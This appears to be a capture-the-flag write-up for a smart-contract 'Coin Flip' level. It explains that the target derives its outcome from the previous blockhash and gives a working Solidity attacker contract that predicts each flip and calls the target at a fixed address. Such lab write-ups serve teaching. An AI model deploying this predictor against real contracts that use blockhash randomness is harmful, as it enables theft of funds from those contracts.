#Coin Flip

Since the logic behind the flip function is shown, we can simply calculate whether or not the coinflip would
land on true or false by following the logic in another smart contract. We make an interface for the original
contract and call true or false depending on the outcome of our simulated flip.

We have to unfortunately wait between each block mine as there is a revert function that prevents
users from flipping all coins from a single block.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
function flip(bool \_guess) external returns (bool);
}

```solidity
contract CoinFlipHelper {
    address constant i_coinFlipAddress = 0x1D71679B7A8FDFDBF8c63FAF82e66290f13e0ee6;
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

   constructor() {
    consecutiveWins = 0;
   }
     function guess () public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == true) {
      ICoinFlip(i_coinFlipAddress).flip(true);
    } else {
        ICoinFlip(i_coinFlipAddress).flip(false);

    }
  }
}
```
